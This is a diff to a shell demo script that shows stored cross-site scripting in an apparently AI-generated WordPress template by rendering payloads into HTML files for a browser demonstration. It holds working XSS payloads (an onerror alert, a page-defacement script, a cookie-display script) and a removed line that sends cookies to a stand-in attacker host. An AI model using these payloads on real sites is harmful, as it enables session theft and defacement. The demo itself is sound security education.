@@ -5,9 +5,13 @@
 # meta fields without sanitization) puts in 'custom_content' becomes
 # raw HTML in every reader's browser.
 #
-# We render the template with PHP's built-in CLI server using a tiny
-# WordPress shim (wp_shim.php) so no WordPress install is needed. The
-# rendered HTML is what a real site would send to a browser.
+# We render the template through PHP CLI using a tiny WordPress shim
+# (wp_shim.php) so no WordPress install is needed. Each render is
+# saved as a standalone .html file in out/. You can:
+#   - read the rendered HTML in stdout to inspect the injected tags
+#   - open out/*.html in a browser via file://
+#   - run ./serve.sh and load http://localhost:8765/ for a fully
+#     realistic browser-execution demo
 #
 # Usage:
 #   ./run-demo.sh
@@ -23,32 +27,72 @@ if ! command -v php >/dev/null 2>&1; then
     exit 1
 fi
 
-run_render() {
-    local label="$1"
-    local payload="$2"
-    echo "=== $label ==="
+mkdir -p out
+
+# Render one case: print to stdout AND write to out/<file>.
+render_case() {
+    local out_file="$1"
+    local label="$2"
+    local payload="$3"
+    local rendered
+    rendered=$(MALICIOUS_BIO="$payload" php -d auto_prepend_file=wp_shim.php victim_module.php)
+
+    # Wrap rendered output in a full standalone HTML document.
+    cat > "out/$out_file" <<EOF
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>$label</title>
+  <style>
+    body { font-family: -apple-system, system-ui, sans-serif; max-width: 720px; margin: 2em auto; padding: 0 1em; }
+    .meta { color: #666; font-size: 0.9em; border-bottom: 1px solid #ddd; padding-bottom: 0.5em; }
+    .render { margin-top: 1.5em; padding: 1em; border: 1px solid #ccc; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <div class="meta">
+    <strong>$label</strong><br>
+    Rendered by output/gpt-4/php_005.php (the AI-generated WordPress theme template) via PHP CLI.
+  </div>
+  <div class="render">$rendered</div>
+</body>
+</html>
+EOF
+
+    echo "--- $label ---"
     echo "  custom_content meta value:"
     echo "    $payload"
-    echo "  rendered HTML (what the browser receives):"
-    MALICIOUS_BIO="$payload" php -d auto_prepend_file=wp_shim.php victim_module.php | sed 's/^/    /'
+    echo "  rendered HTML written to out/$out_file"
+    echo "  (excerpt:)"
+    echo "$rendered" | head -10 | sed 's/^/    /'
     echo
 }
 
-run_render \
+echo "=== Rendering 4 bios through the AI's WordPress template ==="
+echo
+
+render_case "legitimate.html" \
     "Legitimate post meta content" \
     "<p>Welcome to my <strong>blog</strong>!</p>"
 
-run_render \
-    "Malicious post meta content (XSS payload)" \
+render_case "alert.html" \
+    "Malicious post meta content - alert() XSS payload" \
     "<img src=x onerror=\"alert('XSS - attacker JS runs in every viewer browser')\">"
 
-run_render \
-    "Malicious post meta content - cookie exfiltration variant" \
-    "<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>"
+render_case "defacement.html" \
+    "Malicious post meta content - DOM defacement payload" \
+    "<script>document.body.innerHTML='<h1 style=\"color:red;font-family:sans-serif;text-align:center;margin-top:20vh\">Hijacked by attacker</h1>'</script>"
+
+render_case "cookie-display.html" \
+    "Malicious post meta content - cookie-display payload" \
+    "<script>document.body.innerHTML += '<pre style=\"background:#fee;padding:1em;color:#900;font-size:14pt\">cookies the attacker can read: ' + (document.cookie || '(none on this localhost page)') + '</pre>'</script>"
 
 echo "=== Done ==="
-echo "The AI's template echoed every meta value verbatim — including the"
-echo "<img onerror=...> and <script>...</script> tags. When this HTML is"
-echo "served to a browser, the attacker's JavaScript runs in the viewer's"
-echo "session, with full access to cookies, localStorage, and any actions"
-echo "the page is authorized to perform."
+echo "Open one of the generated files in a browser to see each payload"
+echo "execute. The alert.html and defacement.html pages are the most"
+echo "visible on stage — alert popping a dialog, defacement replacing"
+echo "the page body with a red 'Hijacked by attacker' banner."
+echo
+echo "For an http:// demo (recommended, behaves identically to a real"
+echo "victim hitting the live site), run: ./serve.sh"
